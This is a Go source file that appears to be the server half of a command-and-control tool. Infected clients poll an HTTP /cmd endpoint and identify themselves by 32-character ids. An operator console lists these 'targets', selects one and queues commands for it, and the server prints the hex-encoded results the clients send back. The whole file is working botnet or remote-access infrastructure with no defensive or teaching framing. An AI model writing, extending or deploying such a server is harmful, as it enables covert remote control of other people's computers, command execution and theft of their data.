package main

import (
	"bufio"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	TMAXSIZE = (1 << 6)
)

var (
	Mutex       sync.Mutex
	Target      = "NULL"
	Command     = "NULL"
	ListTargets = make(map[string]time.Time)
)

func main() {
	fmt.Println("Server is listening...\n")
	go adminConsole()
	http.HandleFunc("/", indexPage)
	http.HandleFunc("/cmd", cmdPage)
	http.ListenAndServe(":8080", nil)
}

func help() string {
	return `
1. exit // exit from program
2. help // help info for commands
3. targ // set target by uid
4. cmnd // set command to target
5. list // get list of targets
`
}

func adminConsole() {
	var (
		message string
		splited []string
	)
	for {
		message = inputString("> ")
		splited = strings.Split(message, " ")
		switch splited[0] {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println(help())
		case "targ":
			if len(splited) != 2 {
				fmt.Printf("target = '%s'\n\n", Target)
				continue
			}
			Target = splited[1]
			fmt.Println("target set\n")
		case "list":
			Mutex.Lock()
			i := 1
			for targv, timet := range ListTargets {
				if time.Now().Sub(timet) > (3 * time.Minute) {
					delete(ListTargets, targv)
					continue
				}
			}
			for targv := range ListTargets {
				fmt.Println(i, targv)
				i++
			}
			fmt.Println()
			Mutex.Unlock()
		case "cmnd":
			Command = strings.Join(splited[1:], " ")
		default:
			fmt.Println("error: command undefined\n")
		}
	}
}

func inputString(begin string) string {
	fmt.Print(begin)
	msg, _ := bufio.NewReader(os.Stdin).ReadString('\n')
	return strings.Replace(msg, "\n", "", 1)
}

func indexPage(w http.ResponseWriter, r *http.Request) {
	response(w, 0, "success: action completed")
}

func cmdPage(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Body []string `json:"body"`
	}

	if r.Method != "POST" {
		response(w, 1, "error: method != POST")
		return
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		response(w, 2, "error: parse json")
		return
	}
	if len(req.Body) != 2 {
		response(w, 3, "error: len req != 2")
		return
	}
	if len(req.Body[0]) != 32 {
		response(w, 4, "error: len name != 32")
		return
	}

	target := req.Body[0]
	result := req.Body[1]

	Mutex.Lock()
	if len(ListTargets) > TMAXSIZE {
		ListTargets = make(map[string]time.Time)
	}
	ListTargets[target] = time.Now()
	Mutex.Unlock()

	if result != "" && Target == target {
		fmt.Printf("\n%s\n> ", string(hexDecode(result)))
	}

	count := 5
	result = "NULL"

repeat:
	if (Target == target && Command != "NULL") || count == 0 {
		goto close
	}
	count--
	time.Sleep(5 * time.Second)
	goto repeat
close:
	if Target == target {
		result = Command
		Command = "NULL"
	}

	response(w, 0, result)
}

func hexDecode(data string) []byte {
	res, err := hex.DecodeString(data)
	if err != nil {
		return nil
	}
	return res
}

func response(w http.ResponseWriter, ret int, res string) {
	w.Header().Set("Content-Type", "application/json")
	var resp struct {
		Return int    `json:"return"`
		Result string `json:"result"`
	}
	resp.Return = ret
	resp.Result = res
	json.NewEncoder(w).Encode(resp)
}
